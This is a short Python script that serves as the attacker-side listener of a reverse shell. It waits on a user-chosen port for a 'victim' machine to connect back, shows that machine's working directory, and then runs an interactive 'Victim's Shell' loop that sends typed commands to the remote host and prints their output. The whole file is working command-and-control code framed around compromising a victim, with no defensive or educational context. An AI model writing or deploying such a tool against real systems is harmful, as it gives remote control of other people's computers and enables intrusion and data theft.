import socket

server_host = "0.0.0.0"
server_port = int(input("Enter the Port to listen on : "))
size = 1024 * 128
seperator = "<sep>"
socket_object = socket.socket()

socket_object.bind((server_host, server_port))

# to remove the address already in use error :)  (thanks to stack overflow for the solution of this issue)!
socket_object.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
socket_object.listen(7)
print(f"Listening as {server_host}:{server_port} ...")

victim_socket, victim_address = socket_object.accept()
print(f"{victim_address[0]}:{victim_address[1]} Congrats You got a connection !")

cwd = victim_socket.recv(size).decode()
print("[+] Current working directory:", cwd)

while True:
    command = input(f"Victim's Shell > {cwd} $  ")
    if not command.strip():
        continue
    victim_socket.send(command.encode())
    if command.lower() == "exit":
        break
    output = victim_socket.recv(size).decode()
    print("output:", output)
    results, cwd = output.split(seperator)
    print(results)
victim_socket.close()
socket_object.close()
